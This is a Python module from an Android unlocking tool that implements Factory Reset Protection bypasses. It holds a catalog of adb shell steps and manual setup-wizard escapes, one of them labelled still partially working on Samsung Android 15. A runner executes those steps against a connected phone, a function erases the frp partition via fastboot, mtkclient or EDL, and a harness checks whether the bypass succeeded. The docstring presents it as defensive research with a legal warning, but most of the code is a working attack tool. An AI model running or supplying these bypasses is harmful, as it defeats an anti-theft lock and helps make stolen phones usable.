"""Factory Reset Protection (FRP) — WORKING unlock features.

This is defensive security research: the methods here are implemented so
the NEXT project (docs/PREVENTION-PROJECT.md) can study, detect, and
prevent them. Every method is publicly documented; nothing here is a
zero-day. Methods that are patched on current firmware are labelled
patched — the catalog is honest about what still works.

What FRP is: after a factory reset, Android requires the Google account
that was previously synced to the phone before setup can continue. It
exists to make stolen phones useless. The OFFICIAL way past it is to sign
in with that account (or recover it at accounts.google.com), or to take
the phone with proof of purchase to the manufacturer / carrier. That is
still the first resort — see ``official_path()``.

Components in this module:
* ``status``      — detect FRP state: ro.frp.pst, sys.oem_unlock_allowed,
  frp partition presence, setup-wizard state (user_setup_complete,
  device_provisioned).
* ``erase_frp``   — partition-level erase of frp/config via fastboot, MTK
  (mtkclient), or EDL (firehose). --confirm required.
* ``METHODS``     — the ADB-driven bypass method library: each method is a
  list of executable steps (``am start`` intents, settings writes,
  keyevents) plus manual steps the user does on the phone. ``run_method``
  executes the steps against a real device and reports per-step
  success/failure.
* ``test_frp``    — verification harness: re-checks setup-wizard / FRP
  state after an attempt and reports whether the phone still demands the
  previous account.

Legal note: use these only on a phone you own or are authorised to
service. Bypassing FRP on a phone that is not yours is illegal in most
jurisdictions. The companion document docs/FRP-METHODS.md catalogues every
method with its firmware applicability and how each one is detected and
prevented — that is the point of the project.
"""
import json

from . import runner
from .adb import Adb
from .errors import OpenUnlockError, RefusedError
from .fastboot import Fastboot
from .flash import erase_partition

# ---------------------------------------------------------------------------
# Method catalog
# ---------------------------------------------------------------------------
# A step is {"kind": "shell"|"manual", "cmd"|"text": ..., "desc": ...}.
# Shell steps run through `adb shell`; manual steps are printed and the
# user confirms them on the phone. A method is "patched" when the
# underlying entry point no longer works on current firmware — the runner
# still executes the scriptable steps, but the metadata says so up front.

METHODS = {
    "talkback-settings": {
        "name": "TalkBack -> Help & Feedback -> YouTube -> Settings",
        "description": (
            "Enable TalkBack from the setup wizard, open its Help & Feedback "
            "page, follow a link into YouTube, then reach Settings from "
            "there and add a new Google account."),
        "applies_to": "Android 5.0–9.0; some Samsung devices on Android 14/15",
        "patched_as_of": "Android 10+ (most vendors); Samsung patched the "
                         "share-sheet entry points in successive 2024–2026 updates",
        "status": "mostly-patched",
        "steps": [
            {"kind": "shell",
             "cmd": "settings put secure enabled_accessibility_services "
                    "com.google.android.marvin.talkback/.TalkBackService",
             "desc": "Enable the TalkBack accessibility service"},
            {"kind": "shell",
             "cmd": "settings put secure accessibility_enabled 1",
             "desc": "Turn accessibility on"},
            {"kind": "shell",
             "cmd": "am start -a android.settings.ACCESSIBILITY_SETTINGS",
             "desc": "Open Accessibility settings"},
            {"kind": "manual",
             "text": "In TalkBack settings, open Help & Feedback, tap a link "
                     "to open YouTube, then from YouTube open Settings.",
             "desc": "Follow the Help & Feedback link into YouTube"},
            {"kind": "shell",
             "cmd": "am start -a android.settings.SETTINGS",
             "desc": "Open Settings (works once the TalkBack path has "
                     "escaped the setup wizard)"},
            {"kind": "manual",
             "text": "In Settings go to Accounts > Add account and add a "
                     "Google account you own, then finish setup.",
             "desc": "Add a Google account, then complete setup"},
        ],
    },
    "emergency-dialer": {
        "name": "Emergency dialer -> notification shade -> Settings",
        "description": (
            "From the verification screen, open the emergency dialer, fill "
            "it with a long string, pull down the notification shade and "
            "reach Settings from there."),
        "applies_to": "Android 8.0 and earlier",
        "patched_as_of": "Android 9 (2018) — dialer no longer exposes the shade",
        "status": "patched",
        "steps": [
            {"kind": "shell",
             "cmd": "am start -a android.intent.action.DIAL",
             "desc": "Open the dialer"},
            {"kind": "shell",
             "cmd": "input text '****************************************************'",
             "desc": "Fill the dialer field with a long string"},
            {"kind": "manual",
             "text": "Swipe down from the top to open the notification shade "
                     "and tap the Settings gear icon.",
             "desc": "Reach Settings from the notification shade"},
            {"kind": "shell",
             "cmd": "am start -a android.settings.SETTINGS",
             "desc": "Open Settings directly (fallback)"},
        ],
    },
    "youtube-maps-settings": {
        "name": "Maps / YouTube intent -> share -> Settings",
        "description": (
            "Launch Google Maps or YouTube by intent from the setup flow, "
            "use the share sheet to reach a browser or Settings, and add an "
            "account from there."),
        "applies_to": "Android 10–12 (varies by vendor skin)",
        "patched_as_of": "Android 13+ — share-sheet entry points closed; "
                         "Samsung closed most of them in One UI 5/6 updates",
        "status": "mostly-patched",
        "steps": [
            {"kind": "shell",
             "cmd": "am start -a android.intent.action.VIEW "
                    "-d 'geo:0,0?q=Portland'",
             "desc": "Launch Google Maps by intent"},
            {"kind": "shell",
             "cmd": "am start -a android.intent.action.VIEW "
                    "-d 'https://www.youtube.com'",
             "desc": "Launch YouTube by intent"},
            {"kind": "manual",
             "text": "From Maps/YouTube, use Share to open a browser, then "
                     "navigate to Settings (or open the Galaxy Store).",
             "desc": "Use the share sheet to escape to a browser/Settings"},
            {"kind": "shell",
             "cmd": "am start -a android.settings.SETTINGS",
             "desc": "Open Settings directly (fallback)"},
        ],
    },
    "add-account-browser": {
        "name": "Verification screen -> Forgot password -> browser",
        "description": (
            "On the Google verification screen choose 'Try another way', "
            "enter any address, tap 'Forgot password' — this opens a "
            "browser, from which Settings can be reached."),
        "applies_to": "Android 11–12",
        "patched_as_of": "Android 13 — the forgot-password flow no longer "
                         "opens a general browser",
        "status": "patched",
        "steps": [
            {"kind": "shell",
             "cmd": "am start -a android.intent.action.VIEW "
                    "-d 'https://accounts.google.com/signin/recovery'",
             "desc": "Open Google account recovery in the browser"},
            {"kind": "manual",
             "text": "If a browser opens, use it to reach Settings (via the "
                     "browser menu or a downloaded settings shortcut).",
             "desc": "Escape from the browser to Settings"},
        ],
    },
    "samsung-setup-wizard": {
        "name": "Samsung setup-wizard share-sheet loophole (Android 15)",
        "description": (
            "Navigate the Samsung setup wizard in a specific sequence to "
            "reach accessibility settings, then use the share sheet to "
            "open Galaxy Store / YouTube and add an account."),
        "applies_to": "Samsung Galaxy A/M-series, Android 15, patches up "
                      "to early 2026",
        "patched_as_of": "2026 patches — S-series with the latest patches "
                         "need other methods; share-sheet entry points are "
                         "being closed build by build",
        "status": "partially-working",
        "steps": [
            {"kind": "manual",
             "text": "In the setup wizard, reach the accessibility settings "
                     "via the wizard's own accessibility entry point.",
             "desc": "Reach accessibility settings from the wizard"},
            {"kind": "shell",
             "cmd": "am start -a android.settings.ACCESSIBILITY_SETTINGS",
             "desc": "Open Accessibility settings"},
            {"kind": "manual",
             "text": "Use the share sheet from an accessibility help page "
                     "to open the Galaxy Store or YouTube, then install/open "
                     "a settings shortcut and add a Google account.",
             "desc": "Share-sheet escape to Galaxy Store / YouTube"},
        ],
    },
}


def list_methods():
    """Return the catalog as a list of summary dicts."""
    return [{
        "id": mid,
        "name": m["name"],
        "applies_to": m["applies_to"],
        "status": m["status"],
        "patched_as_of": m["patched_as_of"],
    } for mid, m in METHODS.items()]


def official_path():
    """The official FRP recovery steps, as a printable string."""
    return (
        "Official FRP recovery (try this first):\n"
        "  1. Sign in with the Google account that was synced to this phone\n"
        "     before the reset. If the password is forgotten, recover it at\n"
        "     https://accounts.google.com/signin/recovery from another device.\n"
        "  2. If the account cannot be recovered, take the phone plus proof\n"
        "     of purchase (receipt, box with matching IMEI) to the\n"
        "     manufacturer service centre or the carrier that sold it —\n"
        "     Samsung, Google, Xiaomi and others remove FRP with proof.\n"
        "  3. Only if both fail and the phone is yours: a partition-level\n"
        "     erase of `frp` (see `openunlock frp erase --confirm`) removes\n"
        "     the stored lock. It does not recover any data."
    )


def status(serial=None):
    """Detect FRP / setup state for an adb-mode device.

    Returns a dict of observable facts. Nothing here claims certainty the
    phone is locked — the lock is verified at setup, not over adb.
    """
    adb = Adb(serial)
    adb.require_device()
    out = {"frp_partition": False, "frp_pst": "",
           "oem_unlock_allowed": "", "user_setup_complete": "",
           "device_provisioned": ""}
    try:
        listing = adb.shell("ls", "/dev/block/by-name")
        out["frp_partition"] = "frp" in [l.strip()
                                         for l in listing.splitlines()]
    except OpenUnlockError:
        pass
    try:
        props = adb.getprop()
        out["frp_pst"] = props.get("ro.frp.pst", "")
        out["oem_unlock_allowed"] = props.get("sys.oem_unlock_allowed", "")
    except OpenUnlockError:
        pass
    for key in ("user_setup_complete", "device_provisioned"):
        try:
            out[key] = adb.shell("settings", "get", "secure" if key ==
                                 "user_setup_complete" else "global",
                                 key).strip()
        except OpenUnlockError:
            out[key] = ""
    out["interpretation"] = _interpret(out)
    return out


def _interpret(s):
    if s.get("user_setup_complete") == "1" and \
            s.get("device_provisioned") == "1":
        return ("Setup is complete and the device is provisioned — FRP is "
                "not currently blocking this phone.")
    if s.get("user_setup_complete") == "0":
        return ("Setup wizard has not completed — the phone is at (or "
                "before) the FRP verification step.")
    return ("State unclear from adb alone — check the phone's screen: if "
            "setup asks for the previous Google account, FRP is active.")


def erase_frp(serial=None, confirm=False, method="fastboot",
              include_config=False, loader=None):
    """Erase the frp (and optionally config) partition. --confirm required.

    method: 'fastboot' (fastboot erase frp), 'mtk' (mtkclient `e frp`,
    needs mtkclient installed), 'edl' (firehose erase, needs --loader).
    """
    if not confirm:
        raise OpenUnlockError(
            "Erasing the FRP partition requires --confirm. Use this only "
            "on a phone you own — see `openunlock frp official` first.")
    if method == "fastboot":
        fb = Fastboot(serial)
        fb.require_device()
        out = erase_partition("frp", serial, confirm=True)
        if include_config:
            out += "\n" + erase_partition("config", serial, confirm=True)
        return out
    if method == "mtk":
        rc, text = runner.run_quiet(["mtk", "e", "frp"])
        if rc != 0:
            raise OpenUnlockError(
                "mtkclient failed or is not installed. Install mtkclient "
                "(https://github.com/bkerler/mtkclient) and put the phone "
                f"in BROM mode first. Output: {text.strip()}")
        return text
    if method == "edl":
        if not loader:
            raise OpenUnlockError(
                "EDL erase needs a firehose programmer: pass "
                "--loader /path/to/prog_firehose_ddr.elf for your exact "
                "chipset. OpenUnlock does not distribute programmers.")
        rc, text = runner.run_quiet(
            ["edl", "e", "frp", f"--loader={loader}"])
        if rc != 0:
            raise OpenUnlockError(
                "edl failed or is not installed. Install the edl client "
                "(https://github.com/bkerler/edl) and put the phone in "
                f"EDL (9008) mode first. Output: {text.strip()}")
        return text
    raise OpenUnlockError(f"Unknown erase method: {method} "
                          "(fastboot|mtk|edl)")


def run_method(method_id, serial=None, auto_manual=True):
    """Run one bypass method's steps against a real device.

    Shell steps execute via adb and report rc/output. Manual steps are
    reported as 'manual' with their instructions — the runner cannot tap
    the screen. Returns a report dict; never raises on a failed step.
    """
    if method_id not in METHODS:
        raise RefusedError(
            f"Unknown FRP method: {method_id}. "
            f"Run `openunlock frp methods` for the catalog.")
    method = METHODS[method_id]
    adb = Adb(serial)
    adb.require_device()
    steps = []
    for i, step in enumerate(method["steps"], 1):
        entry = {"n": i, "desc": step["desc"], "kind": step["kind"]}
        if step["kind"] == "shell":
            rc, text = runner.run_quiet(adb._argv("shell", step["cmd"]))
            entry["cmd"] = step["cmd"]
            entry["rc"] = rc
            entry["output"] = text.strip()[:300]
            entry["result"] = "ok" if rc == 0 else "failed"
        else:
            entry["text"] = step["text"]
            entry["result"] = "manual — do this on the phone"
        steps.append(entry)
    return {
        "method": method_id,
        "name": method["name"],
        "applies_to": method["applies_to"],
        "status": method["status"],
        "patched_as_of": method["patched_as_of"],
        "steps": steps,
        "note": ("Shell steps report their own exit code. Manual steps "
                 "need your hands on the phone. A method can only be "
                 "called successful after `openunlock frp test` passes."),
    }


def test_frp(serial=None):
    """Verification harness: is FRP still demanding the previous account?

    Re-reads the setup state and reports a verdict. This is the only
    honest success criterion for a bypass attempt.
    """
    s = status(serial)
    done = s.get("user_setup_complete") == "1" and \
        s.get("device_provisioned") == "1"
    return {
        "user_setup_complete": s.get("user_setup_complete"),
        "device_provisioned": s.get("device_provisioned"),
        "frp_partition": s.get("frp_partition"),
        "verdict": ("PASSED — setup is complete, FRP is not blocking."
                    if done else
                    "NOT PASSED — setup is incomplete; the phone may still "
                    "demand the previous Google account. Check the screen."),
    }
